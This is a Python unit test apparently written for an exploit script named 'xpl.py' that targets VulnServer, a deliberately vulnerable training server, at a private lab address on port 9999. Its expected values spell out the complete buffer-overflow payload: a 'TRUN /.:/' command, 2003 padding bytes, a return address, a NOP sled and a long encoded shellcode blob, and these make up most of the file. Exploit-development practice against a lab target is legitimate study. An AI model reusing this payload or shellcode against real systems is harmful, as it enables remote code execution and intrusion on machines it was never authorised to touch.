import contextlib
import importlib.util
import io
import pathlib
import sys
import unittest
from unittest.mock import patch


MODULE_PATH = pathlib.Path(__file__).with_name("xpl.py")


class FakeSocket:
    def __init__(self):
        self.connected_to = None
        self.sent_data = []
        self.recv_responses = [b"VulnServer ready\r\n", b"Crash triggered\r\n"]
        self.closed = False

    def connect(self, address):
        self.connected_to = address

    def recv(self, size):
        return self.recv_responses.pop(0)

    def send(self, data):
        self.sent_data.append(data)

    def close(self):
        self.closed = True


class FakeSocketFactory:
    def __init__(self):
        self.instances = []

    def __call__(self, *args, **kwargs):
        instance = FakeSocket()
        self.instances.append(instance)
        return instance


def load_module_with_fake_socket():
    module_name = "xpl_under_test"
    sys.modules.pop(module_name, None)

    fake_factory = FakeSocketFactory()
    spec = importlib.util.spec_from_file_location(module_name, MODULE_PATH)
    module = importlib.util.module_from_spec(spec)

    stdout = io.StringIO()
    with patch("socket.socket", fake_factory), contextlib.redirect_stdout(stdout):
        assert spec.loader is not None
        spec.loader.exec_module(module)

    return module, fake_factory.instances[0], stdout.getvalue()


class XplTests(unittest.TestCase):
    def test_import_executes_payload_flow_and_builds_payload(self):
        module, fake_socket, output = load_module_with_fake_socket()

        expected_shellcode = (
            b"\xd9\xe1\xbe\x77\xa9\xa4\xfa\xd9\x74\x24\xf4\x5b\x29\xc9"
            b"\xb1\x52\x83\xc3\x04\x31\x73\x13\x03\x04\xba\x46\x0f\x16"
            b"\x54\x04\xf0\xe6\xa5\x69\x78\x03\x94\xa9\x1e\x40\x87\x19"
            b"\x54\x04\x24\xd1\x38\xbc\xbf\x97\x94\xb3\x08\x1d\xc3\xfa"
            b"\x89\x0e\x37\x9d\x09\x4d\x64\x7d\x33\x9e\x79\x7c\x74\xc3"
            b"\x70\x2c\x2d\x8f\x27\xc0\x5a\xc5\xfb\x6b\x10\xcb\x7b\x88"
            b"\xe1\xea\xaa\x1f\x79\xb5\x6c\x9e\xae\xcd\x24\xb8\xb3\xe8"
            b"\xff\x33\x07\x86\x01\x95\x59\x67\xad\xd8\x55\x9a\xaf\x1d"
            b"\x51\x45\xda\x57\xa1\xf8\xdd\xac\xdb\x26\x6b\x36\x7b\xac"
            b"\xcb\x92\x7d\x61\x8d\x51\x71\xce\xd9\x3d\x96\xd1\x0e\x36"
            b"\xa2\x5a\xb1\x98\x22\x18\x96\x3c\x6e\xfa\xb7\x65\xca\xad"
            b"\xc8\x75\xb5\x12\x6d\xfe\x58\x46\x1c\x5d\x35\xab\x2d\x5d"
            b"\xc5\xa3\x26\x2e\xf7\x6c\x9d\xb8\xbb\xe5\x3b\x3f\xbb\xdf"
            b"\xfc\xaf\x42\xe0\xfc\xe6\x80\xb4\xac\x90\x21\xb5\x26\x60"
            b"\xcd\x60\xe8\x30\x61\xdb\x49\xe0\xc1\x8b\x21\xea\xcd\xf4"
            b"\x52\x15\x04\x9d\xf9\xec\xcf\x62\x55\x8a\x1a\x0b\xa4\x52"
            b"\x24\x70\x21\xb4\x4c\x96\x64\x6f\xf9\x0f\x2d\xfb\x98\xd0"
            b"\xfb\x86\x9b\x5b\x08\x77\x55\xac\x65\x6b\x02\x5c\x30\xd1"
            b"\x85\x63\xee\x7d\x49\xf1\x75\x7d\x04\xea\x21\x2a\x41\xdc"
            b"\x3b\xbe\x7f\x47\x92\xdc\x7d\x11\xdd\x64\x5a\xe2\xe0\x65"
            b"\x2f\x5e\xc7\x75\xe9\x5f\x43\x21\xa5\x09\x1d\x9f\x03\xe0"
            b"\xef\x49\xda\x5f\xa6\x1d\x9b\x93\x79\x5b\xa4\xf9\x0f\x83"
            b"\x15\x54\x56\xbc\x9a\x30\x5e\xc5\xc6\xa0\xa1\x1c\x43\xc0"
            b"\x43\xb4\xbe\x69\xda\x5d\x03\xf4\xdd\x88\x40\x01\x5e\x38"
            b"\x39\xf6\x7e\x49\x3c\xb2\x38\xa2\x4c\xab\xac\xc4\xe3\xcc"
            b"\xe4"
        )

        expected_payload = b"A" * 2003 + b"\x05\x12\x50\x62" + b"\x90" * 16 + module.shellcode
        expected_send = b"TRUN /.:/" + expected_payload + b"\r\n"

        self.assertEqual(fake_socket.connected_to, ("192.168.100.131", 9999))
        self.assertEqual(fake_socket.sent_data, [expected_send])
        self.assertTrue(fake_socket.closed)
        self.assertEqual(output, "VulnServer ready\r\n\nCrash triggered\r\n\n")
        self.assertEqual(module.shellcode, expected_shellcode)
        self.assertEqual(module.payload, expected_payload)
        self.assertEqual(len(module.payload), 2003 + 4 + 16 + len(module.shellcode))


if __name__ == "__main__":
    unittest.main()